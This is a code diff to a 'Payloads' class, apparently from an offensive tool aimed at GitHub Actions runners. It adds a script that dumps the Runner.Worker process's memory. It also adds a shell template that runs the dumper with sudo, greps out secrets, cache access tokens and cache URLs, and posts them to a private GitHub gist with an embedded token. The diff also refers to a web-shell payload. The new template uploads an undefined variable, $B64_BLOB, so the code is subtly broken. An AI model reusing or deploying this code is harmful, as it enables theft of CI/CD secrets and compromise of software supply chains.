@@ -1,8 +1,49 @@
 import yaml
+import base64
 
 
 class Payloads:
     """Collection of payload template used for various attacks."""
+
+    MEMDUMP_PY = b"""
+#!/usr/bin/env python3
+
+import sys
+import os
+import re
+
+def get_pid():
+    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
+
+    for pid in pids:
+        with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmdline_f:
+            if b'Runner.Worker' in cmdline_f.read():
+                return pid
+
+    raise Exception('Can not get pid of Runner.Worker')
+
+if __name__ == "__main__":
+    pid = get_pid()
+
+    map_path = f"/proc/{pid}/maps"
+    mem_path = f"/proc/{pid}/mem"
+
+    with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
+        for line in map_f.readlines():  # for each mapped region
+            m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
+            if m.group(3) == 'r':  # readable region
+                start = int(m.group(1), 16)
+                end = int(m.group(2), 16)
+                if start > sys.maxsize:
+                    continue
+                mem_f.seek(start)  # seek to region start
+            
+                try:
+                    chunk = mem_f.read(end - start)  # read region contents
+                    sys.stdout.buffer.write(chunk)
+                except OSError:
+                    continue
+"""
 
     ROR_SHELL = b"""
 name: Web Shell
@@ -99,28 +140,25 @@ fi
 """
 
     @staticmethod
-    def create_exfil_payload():
+    def create_exfil_payload(exfil_pat, exfil_name, sleep_time):
         """Creates a Gist hosting an exfiltration payload."""
-
         payload = """
 if [[ "$OSTYPE" == "linux-gnu" ]]; then
-  ENCODED_MEMDUMP="{}"
-  B64_BLOB=`base64 -d $ENCODED_MEMDUMP | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' | sort -u | base64 -w 0`
-  GIST_TOKEN="{}"
-  GIST_TOKEN_DECODED=`echo $GIST_TOKEN | base64 -d`
-
-  curl -L \
-    -X POST \
-    -H "Accept: application/vnd.github+json" \
-    -H "Authorization: Bearer $GIST_TOKEN_DECODED" \
-    -H "X-GitHub-Api-Version: 2022-11-28" \
-    https://api.github.com/gists -d '{"public":false,"files":{"Exfil":{"content":"'$B64_BLOB'"}}}' > /dev/null
-
-    sleep 900
+  ENCODED_MEMDUMP="{0}"
+  SECRETS=`echo $ENCODED_MEMDUMP | base64 -d | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{{"value":"[^"]*","isSecret":true\\}}' | sort -u | base64 -w 0`
+  CACHETOKEN=`echo $ENCODED_MEMDUMP | base64 -d | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u`
+  CACHEURL=`echo $ENCODED_MEMDUMP | base64 -d | sudo python3 | tr -d '\0' | grep -aoE '"CacheServerUrl":"[^"]*"' | sort -u`
+  GIST_TOKEN_DECODED=`echo "{1}" | base64 -d`
+  curl -L -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer $GIST_TOKEN_DECODED" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/gists -d '{{"public":false,"files":{{"{2}":{{"content":"'"$B64_BLOB:$CACHETOKEN:$CACHEURL"'"}}}}}}' > /dev/null 2>&1
+  sleep {3}
 else
   exit 0
 fi
 """
+        exfil_pat = base64.b64encode(exfil_pat.encode("utf-8")).decode("utf-8")
+        encoded_memdump = base64.b64encode(Payloads.MEMDUMP_PY).decode("utf-8")
+
+        return payload.format(encoded_memdump, exfil_pat, exfil_name, sleep_time)
 
     @staticmethod
     def create_ror_workflow(
